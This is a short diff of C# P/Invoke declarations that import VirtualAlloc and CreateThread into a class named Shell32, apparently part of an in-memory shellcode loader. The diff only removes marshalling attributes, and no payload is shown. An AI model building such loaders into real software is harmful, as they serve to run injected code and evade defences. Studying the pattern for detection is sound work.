@@ -24,10 +24,10 @@ using System;
 using System.Runtime.InteropServices;
 
 public class Shell32{
-[DllImport("Kernel32.dll")][return: MarshalAs(UnmanagedType.LPArray, SizeParamIndex = 1)]
+[DllImport("Kernel32.dll")]
 public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);
 
-[DllImport("Kernel32.dll")][return: MarshalAs(UnmanagedType.SysInt)]
+[DllImport("Kernel32.dll")]
 public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
 
 [DllImport("coredll.dll", SetLastError = true)]
